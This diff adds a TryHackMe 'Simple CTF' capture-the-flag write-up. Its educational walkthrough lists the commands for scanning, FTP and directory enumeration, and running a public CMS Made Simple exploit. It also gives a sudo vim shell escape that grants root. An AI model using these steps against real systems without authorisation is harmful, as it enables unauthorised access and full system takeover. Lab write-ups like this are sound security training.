@@ -1,0 +1,98 @@
+Room: Simple CTF  
+Platform: TryHackMe  
+Difficulty: Easy  
+Status: Completed
+
+Note:This write-up is intended for educational purposes only. Sensitive information such as IP addresses, credentials, hashes, and flags has been omitted.
+
+Objective
+The objective of this room was to practice basic enumeration, web application analysis, exploitation of a known CMS vulnerability, SSH access, and privilege escalation.
+
+Skills Practiced
+- Nmap Enumeration
+- FTP Enumeration
+- Directory Brute Forcing
+- CMS Enumeration
+- Searchsploit
+- SSH
+- Linux Enumeration
+- Privilege Escalation
+
+ Tools Used
+- Nmap
+- FTP
+- Gobuster
+- Curl
+- Searchsploit
+- SSH
+- Vim
+
+Walkthrough
+1. Initial Enumeration
+
+Started by scanning the target using Nmap:nmap -sV -sC -A <TARGET-IP>
+The scan identified several open services, including an FTP service.
+
+2. FTP Enumeration
+Connected to the FTP service:ftp <TARGET-IP>
+While exploring the FTP server, passive mode caused connection issues.
+Disabled passive mode using:passive
+
+Useful commands:
+ls
+get <filename>
+cat <filename>
+The downloaded files contained useful information for the next stage.
+
+3. Directory Enumeration
+Performed directory brute forcing using Gobuster:gobuster dir \ -u http://<TARGET-IP> \ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+This revealed a hidden web directory.
+
+4. Web Enumeration
+Retrieved the web page from the command line:curl http://<TARGET-IP>/simple/
+The application was identified as CMS Made Simple.
+
+5. Vulnerability Research
+Searched for publicly available exploits:searchsploit "CMS Made Simple"
+A suitable exploit was available.
+Executed the exploit:python2 <exploit>.py -u http://<TARGET-IP>/simple
+The exploit successfully disclosed information that allowed further access to the system.
+
+6. SSH Access
+Connected to the SSH service using the recovered credentials:ssh <username>@<TARGET-IP> -p <port>
+Verified access:whoami
+
+7. Enumeration
+Collected information about the current user.
+id
+sudo -l
+ls
+Read the user flag:cat user.txt(Flag omitted.)
+
+8. Privilege Escalation
+Discovered that Vim could be executed with elevated privileges.
+Started Vim.
+sudo vim
+Spawned a root shell.
+:!/bin/sh
+Confirmed root access.
+whoami
+Output:
+root
+Navigated to the root directory.
+cd /root
+ls
+cat root.txt(Flag omitted.)
+
+Conclusion
+This room provided hands-on experience with the complete penetration testing workflow:
+
+Enumeration
+Service Analysis
+Web Enumeration
+Exploitation
+SSH Access
+Linux Enumeration
+Privilege Escalation
+
+It was an excellent beginner-friendly room for understanding the importance of thorough enumeration and identifying privilege escalation opportunities.
